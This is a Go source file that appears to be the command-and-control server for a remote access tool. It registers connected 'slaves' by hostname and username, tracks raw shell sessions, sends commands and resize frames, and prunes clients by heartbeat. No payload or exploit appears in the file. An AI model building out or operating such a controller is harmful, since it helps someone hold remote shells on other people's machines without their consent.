package main

import (
	"fmt"
	"net"
	"sync"
	"time"

	"zheng/internal/proto"
)

// client is a live, connected slave.
type client struct {
	id    int
	conn  net.Conn
	recon proto.Recon
	addr  string

	writeMu sync.Mutex // serializes writes on conn (control frames + resize frames)

	shell bool // a raw shell session is active on this conn
	mu    sync.Mutex
}

func (c *client) setShell(on bool) {
	c.mu.Lock()
	c.shell = on
	c.mu.Unlock()
}

func (c *client) inShell() bool {
	c.mu.Lock()
	defer c.mu.Unlock()
	return c.shell
}

// sendCmd writes a control command, serialized against resize frames.
func (c *client) sendCmd(cmd string) error {
	c.writeMu.Lock()
	defer c.writeMu.Unlock()
	return proto.WriteJSON(c.conn, map[string]string{"cmd": cmd})
}

// sendResize writes an in-band resize frame, serialized against control writes.
func (c *client) sendResize(rows, cols int) error {
	c.writeMu.Lock()
	defer c.writeMu.Unlock()
	_, err := c.conn.Write(proto.FormatResizeFrame(rows, cols))
	return err
}

// registry is the set of live clients.
type registry struct {
	mu       sync.Mutex
	nextID   int
	clients  map[int]*client
	notifs   int
}

func newRegistry(nextID int) *registry {
	return &registry{nextID: nextID, clients: make(map[int]*client)}
}

func (r *registry) get(id int) (*client, bool) {
	r.mu.Lock()
	defer r.mu.Unlock()
	c, ok := r.clients[id]
	return c, ok
}

func (r *registry) count() int {
	r.mu.Lock()
	defer r.mu.Unlock()
	return len(r.clients)
}

func (r *registry) notify() {
	r.mu.Lock()
	r.notifs++
	r.mu.Unlock()
}

// takeNotifications returns and clears the pending new-connection count.
func (r *registry) takeNotifications() int {
	r.mu.Lock()
	defer r.mu.Unlock()
	n := r.notifs
	r.notifs = 0
	return n
}

// add registers a newly connected slave, reusing the stored ID for a known host/user pair.
func (r *registry) add(conn net.Conn, recon proto.Recon) (*client, bool) {
	r.mu.Lock()
	defer r.mu.Unlock()

	reconnect := false
	id := r.nextID
	for _, c := range r.clients {
		if c.recon.Hostname == recon.Hostname && c.recon.Username == recon.Username {
			id = c.id
			reconnect = true
			break
		}
	}
	if !reconnect {
		if storedID, ok := dbLookupClientID(recon.Hostname, recon.Username); ok {
			id = storedID
			reconnect = true
		}
	}
	if id >= r.nextID {
		r.nextID = id + 1
	}

	c := &client{
		id:   id,
		conn: conn,
		recon: recon,
		addr: conn.RemoteAddr().String(),
	}
	r.clients[id] = c
	return c, reconnect
}

func (r *registry) remove(id int) {
	r.mu.Lock()
	c, ok := r.clients[id]
	if ok {
		delete(r.clients, id)
	}
	r.mu.Unlock()

	if ok {
		c.conn.Close()
		dbMarkInactive(id)
		fmt.Printf("\n[!] client %d disconnected (%s@%s)\n", id, c.recon.Username, c.recon.Hostname)
	}
}

// dropIfIdle removes the client if it is not in a shell; used by /check failures.
func (r *registry) dropIfIdle(c *client) {
	if !c.inShell() {
		r.remove(c.id)
	}
}

// ids returns all live client IDs.
func (r *registry) ids() []int {
	r.mu.Lock()
	defer r.mu.Unlock()
	out := make([]int, 0, len(r.clients))
	for id := range r.clients {
		out = append(out, id)
	}
	return out
}

// heartbeatWatch pings every client periodically; a client that fails two
// consecutive pings is dropped and marked inactive in the db.
func (r *registry) heartbeatWatch(interval time.Duration) {
	const maxMissed = 2
	missed := make(map[int]int)

	for range time.Tick(interval) {
		for _, id := range r.ids() {
			c, ok := r.get(id)
			if !ok || c.inShell() {
				continue
			}
			if err := pingClient(c); err != nil {
				missed[id]++
				if missed[id] >= maxMissed {
					missed[id] = 0
					r.remove(id)
				}
			} else {
				missed[id] = 0
			}
		}
	}
}
